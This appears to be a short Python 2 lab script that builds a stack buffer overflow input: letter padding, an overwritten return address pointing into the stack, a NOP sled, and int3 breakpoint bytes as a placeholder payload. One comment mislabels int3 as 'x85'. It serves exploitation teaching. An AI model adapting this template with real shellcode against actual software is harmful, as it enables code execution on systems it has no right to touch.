import struct
overflow = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"

# eip's saved location is overwritten with the address I want eip to point to
# outside of GDB, you won't know exactly where the stack is next,
# so you have to overwrite a big chunk of stack with NOP and
# then point EIP somewhere in the middle

# jump farther into the stack +70
eip = struct.pack("I", 0xbffff7b0+70)

# now load a big nop sled
sled = "\x90"*100

# payload is the x85 int3 instruction, which is an interrupt (breakpoint)
payload = "\xCC"*4

print overflow + eip + sled + payload